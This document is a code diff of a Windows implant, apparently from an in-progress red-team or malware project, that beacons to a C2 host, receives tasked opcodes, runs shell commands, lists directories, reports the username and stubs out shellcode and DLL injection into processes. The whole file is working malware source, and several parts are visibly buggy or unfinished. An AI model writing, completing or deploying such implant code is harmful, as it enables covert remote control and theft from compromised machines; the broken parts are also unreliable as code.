@@ -1,22 +1,17 @@
 #define PB_ENABLE_MALLOC 1
 #include "include/debug.h"
-
 #include "implant.h"
-
 #include <windows.h>
-
 #include "include/execute.h"
 #include "include/httpclient.h"
+#include "list_directory.h"
 //#include "http_client.h"
-
 #include <stdio.h>
 #include <string.h>
 #include <iphlpapi.h>
-
 #include <pb_encode.h>
 #include <pb_decode.h>
 #include "implant.pb.h"
-
 #include "opcodes.h"
 
 LPBYTE ImplantID_PT1 = NULL; // MachineGUID
@@ -84,6 +79,27 @@ void FreeTaskResponse(TaskResponse *tResp) {
     free(tResp->Response);
     tResp->Response = NULL;
   }
+}
+
+// Function to encode the TaskResponse message
+BYTE *EncodeTaskResponse(TaskResponse *tr, size_t *stBuffSize) {
+  bool status = pb_get_encoded_size(stBuffSize, TaskResponse_fields, tr);
+  if (!status) {
+    DEBUG_PRINTF("Failed to get TaskReponse size: \n");
+    return NULL;
+  }
+
+  BYTE *trBuffer = (BYTE *)malloc(*stBuffSize);
+  pb_ostream_t stream = pb_ostream_from_buffer(trBuffer, *stBuffSize);
+
+  status = pb_encode(&stream, TaskResponse_fields, tr);
+  if (!status) {
+    DEBUG_PRINTF("Encoding failed: %s\n", PB_GET_ERROR(&stream));
+    free(trBuffer);
+    return NULL;
+  }
+
+  return trBuffer;
 }
 
 int GetMachineGUID() {
@@ -236,116 +252,239 @@ BOOL DoCheckin(TaskResponse *tResp, TaskRequest *tReq) {
 	
 	ImplantCheckin ic = ImplantCheckin_init_zero;
 	ic.ImplantID = (char *)ImplantID;
+	//size_t trBufferSize = 0;
 	ic.Resp = tResp;
+	//EncodeTaskResponse(tResp, &trBufferSize);
 
 	size_t outboundBufferSize = 0;
-    size_t inboundBufferSize = 0;
+	size_t inboundBufferSize = 0;
 	BYTE *outboundBuffer = EncodeImplantCheckin(&ic, &outboundBufferSize);
-	
-    // LPBYTE response = SendToServer(POST_VERB, CHECKIN_PATH, outboundBuffer, outboundBufferSize, &inboundBufferSize);
+	DEBUG_PRINTF("OUTBOUND BUFFER = %s\n", outboundBuffer);
+	// LPBYTE response = SendToServer(POST_VERB, CHECKIN_PATH, outboundBuffer, outboundBufferSize, &inboundBufferSize);
 
 	LPBYTE response = HTTPRequest(POST_VERB, C2_HOST, CHECKIN_PATH, C2_PORT, C2_UA				, outboundBuffer, outboundBufferSize, &inboundBufferSize, USE_TLS);
-    if (response != NULL) {
-        DEBUG_PRINTF("Register Sent!\n");
-        free(response);
-        return TRUE;
-    }
 
-
-	FreeTaskResponse(tResp);
-	free(outboundBuffer);
-	
-	if (response != NULL && inboundBufferSize > 0) {
-		BOOL status = DecodeTaskRequest(response, inboundBufferSize, tReq);
+	/*
+	if (response != NULL) {
+		DEBUG_PRINTF("Register Sent!\n");
 		free(response);
+		return TRUE;
+	}*/
+
+	// FreeTaskResponse(tResp);
+	// free(outboundBuffer);
+	/**if (response != NULL) {
+		DEBUG_PRINTF("RESPONSE IS NOT NULL. SIZE IS %llu.\n", inboundBufferSize); 
+		DEBUG_PRINTF("RESPONSE IS: **%s**\n", response);
+	}**/
+	
+	if (inboundBufferSize > 0) {
+		BOOL status = DecodeTaskRequest(response, inboundBufferSize, tReq);
+		
+		DEBUG_PRINTF("TREQ:\n");
+		//DEBUG_PRINTF("    - TaskID = %ld\n", *tReq->TaskID);
+		//DEBUG_PRINTF("    - TaskID = %ld\n", *tReq->Opcode);
+		DEBUG_PRINTF("    - Args = %s\n", tReq->Args);
+
 		if (status && tReq->TaskID == NULL) {
 			// No task to perform, null out the TaskResponse
 			memset(tResp, 0, sizeof(TaskResponse));
 		}
+		free(response);
 		return status;
 	}
 	
 	if (response) {
 		free(response);
 	}
+
 	return FALSE;
+}
+
+BOOL StdlibOperation(TaskRequest *tr, char* data, size_t *dataSize)
+{
+	DEBUG_PRINTF("STD_LIB\n");
+	DEBUG_PRINTF("%s\n", tr->Args);
+	int stdlib_opcode = (int)tr->Args[0];
+    DEBUG_PRINTF("%d\n", stdlib_opcode);
+    memmove(tr->Args, tr->Args+1, strlen(tr->Args));
+    DEBUG_PRINTF("ARGS = %s\n", tr->Args);
+    DEBUG_PRINTF("made data. doing opcode\n");
+
+    switch (stdlib_opcode)
+    {
+
+    case 49:
+	    DEBUG_PRINTF("LIST DIRECTORY\n");
+        data = listdirs(tr->Args);
+	dataSize = strlen(data);
+        break;
+
+    case 2:
+        //data = readfile(args);
+        break;
+
+    case 3:
+        //data = getdir();
+        break;
+
+    case 4:
+        //data = removefile(args);
+        break;
+
+    case 5:
+        //data = makedirectory(args);
+        break;
+
+    case 6:
+        //data = changedir(args);
+        break;
+
+    case 7:
+        //data = whoami(args);
+        break;
+
+    default:
+        break;
+	return false;
+    }
+    printf("RESULT: %s\n", data);
+    printf("calling back\n");
+    return true;
 }
 
 // Function to handle the opcode received from the C2 server
 int HandleOpcode(TaskRequest *tr, TaskResponse *tResp) {
+	printf("OPCODE = %d\n", tr->Opcode);
 
-    switch(*(tr->Opcode)) {
-        case OPCODE_LS: {
-            DEBUG_PRINTF("DOING LS\n"); 
-            size_t stOut = 0;
-            LPBYTE cmdOut = ExecuteCmd(tr->Args, &stOut);
-            
-            // warning unsafe for any command that isn't a string
-            DEBUG_PRINTF("EXEC: %s", (char *)cmdOut);
-            pb_bytes_array_t *bytes_array = (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(stOut));
-            if (!bytes_array) {
-                free(cmdOut);
-                return 1;
-            }
-            
-            bytes_array->size = stOut;
-            memcpy(bytes_array->bytes, cmdOut, stOut);
-            free(cmdOut);
-            
-            tResp->TaskID = tr->TaskID;
-            tResp->Response = bytes_array;
-            
-            break; 
-        }
+	bool Success = false;
+	printf("SUCCES = FALSE\n");
 
-        case OPCODE_EXEC: {
-            size_t stOut = 0;
-            LPBYTE cmdOut = ExecuteCmd(tr->Args, &stOut);
-            
-            // warning unsafe for any command that isn't a string
-            DEBUG_PRINTF("EXEC: %s", (char *)cmdOut);
-            pb_bytes_array_t *bytes_array = (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(stOut));
-            if (!bytes_array) {
-                free(cmdOut);
-                return 1;
-            }
-            
-            bytes_array->size = stOut;
-            memcpy(bytes_array->bytes, cmdOut, stOut);
-            free(cmdOut);
-            
-            tResp->TaskID = tr->TaskID;
-            tResp->Response = bytes_array;
-            
+	switch (tr->Opcode)
+        {
+        case OPCODE_NOTASK:
+            // no task, just sleep an check in later
+            Success = true;
             break;
-            
-            case OPCODE_WHOAMI: {
-                char username[MAX_PATH] = {0};
-                DWORD dwSize = MAX_PATH;
-                
-                GetUserNameA(username, &dwSize);
-                dwSize--;
-                pb_bytes_array_t *bytes_array =
-                (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(dwSize));
-                
-                if (!bytes_array) {
-                    return 1;
-                }
-                
-                DEBUG_PRINTF("Opcode: Username %s:%lu\n", username, dwSize);
-                bytes_array->size = (size_t)dwSize;
-                memcpy(bytes_array->bytes, username, (size_t)dwSize);
-                tResp->TaskID = tr->TaskID;
-                tResp->Response = bytes_array;
-                break;
-            }
-            
-            default:
-            DEBUG_PRINTF("INVALID Opcode\n");
-            return 1;
+
+        case OPCODE_INJECT_EX_CODE:
+            // inject shellcode into a running process
+            //Success = InjectExecuteCode(Buffer);
+            break;
+
+        case OPCODE_SPAWN_EXECUTE:
+            // spawn a process and inject code into its main thread
+            //Success = SpawnExecuteCode(Buffer);
+            break;
+
+        case OPCODE_STDLIB:
+            // stdlib command so lets run it
+            DEBUG_PRINTF("STDLIB TO DO\n");
+	    size_t *outputSize = 0;
+	    char* output = malloc(4096);
+	    // Directory size can't be bigger than page. Womp womp.
+	    Success = StdlibOperation(tr, output, &outputSize);
+	    if (Success) {
+		    DEBUG_PRINTF("WE GOT ER\n");
+		    tResp->TaskID = tr->TaskID;
+		    tResp->ImplantID = (char *) ImplantID;
+		    tResp->Response = (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(output));
+		    memcpy(tResp->Response, output, outputSize);
+	    }
+	    DEBUG_PRINTF("RESPONSE = %s\n", (char *)output);
+	    free(output); 
+            break;
+
+        case OPCODE_INJECT_EX_DLL:
+            // inject a dll into a running process
+            //Success = InjectExecuteDll(Buffer);
+            break;
+
+        case OPCODE_RIP_C2:
+            // beacon will die
+            return 2;
         }
-    }
-    return 0;
+
+        if (!Success)
+        {
+            // ReportExecutionFail();
+	    return 1;
+        }
+	
+	return 0;
+/**	
+	if (tr->Opcode == OPCODE_LS)
+	{
+	DEBUG_PRINTF("DOING LS\n");
+	size_t outputBufferSize = 0;
+
+	if tr->
+	LPBYTE outputBuffer = ListFiles(tr->Args, &outputBufferSize);
+			DEBUG_PRINTF("Execute ls.\n");
+			LPBYTE cmdOut = ExecuteCmd(tr->Args, &stOut);
+			DEBUG_PRINTF("Executed ls.\n");
+
+			// warning unsafe for any command that isn't a string
+			DEBUG_PRINTF("EXEC: %s", (char *)cmdOut);
+			pb_bytes_array_t *bytes_array = (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(stOut));
+			
+			if (!bytes_array) {
+				free(cmdOut);
+				return 1;
+			}
+			
+			bytes_array->size = stOut;
+			memcpy(bytes_array->bytes, cmdOut, stOut);
+			free(cmdOut);
+			tResp->TaskID = tr->TaskID;
+			tResp->Response = bytes_array;
+			return 0;
+	}
+	else if (tr->Opcode == OPCODE_EXEC)
+	{
+			size_t stOut = 0;
+			LPBYTE cmdOut = ExecuteCmd(tr->Args, &stOut);
+			// warning unsafe for any command that isn't a string
+			DEBUG_PRINTF("EXEC: %s", (char *)cmdOut);
+			pb_bytes_array_t *bytes_array = (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(stOut));
+			if (!bytes_array) {
+				free(cmdOut);
+				return 1;
+			}
+            
+            		bytes_array->size = stOut;
+            		memcpy(bytes_array->bytes, cmdOut, stOut);
+            		free(cmdOut);
+            
+            		tResp->TaskID = tr->TaskID;
+            		tResp->Response = bytes_array;
+            
+            		return 0;
+	} 
+	else if (tr->Opcode == OPCODE_WHOAMI)
+	{
+                	char username[MAX_PATH] = {0};
+                	DWORD dwSize = MAX_PATH;
+                
+                	GetUserNameA(username, &dwSize);
+                	dwSize--;
+                	pb_bytes_array_t *bytes_array =
+                	(pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(dwSize));
+			if (!bytes_array) {
+                    		return 1;
+                	}
+                
+                	DEBUG_PRINTF("Opcode: Username %s:%lu\n", username, dwSize);
+                	bytes_array->size = (size_t)dwSize;
+                	memcpy(bytes_array->bytes, username, (size_t)dwSize);
+                	tResp->TaskID = tr->TaskID;
+                	tResp->Response = bytes_array;
+                	return 0;
+	}
+	else {
+            		DEBUG_PRINTF("INVALID Opcode\n");
+            		return 1;
+	}**/
 }
 
 int main() {
@@ -370,16 +509,17 @@ int main() {
 		
 		if (DoCheckin(&tResp, &tReq) && tReq.TaskID != NULL) {
 			DEBUG_PRINTF("[+] NEW TASK RECIEVED.\n");
-			HandleOpcode(&tReq, &tResp);
+			int result = HandleOpcode(&tReq, &tResp);
+			DEBUG_PRINTF("FINAL RESULT = %d\n", result);
+			DEBUG_PRINTF("%llu\n", sizeof(tResp.Response));
 		} else {
 			// No task to perform, null out the TaskResponse
 			memset(&tResp, 0, sizeof(TaskResponse));
 		}
 	}
-
-    // If reached here (shouldn't) best bet is going to be kill self.
+	
 	// Free the final task response before exiting
-	// FreeTaskResponse(&tResp);
+	FreeTaskResponse(&tResp);
 	return 0;
 }
 
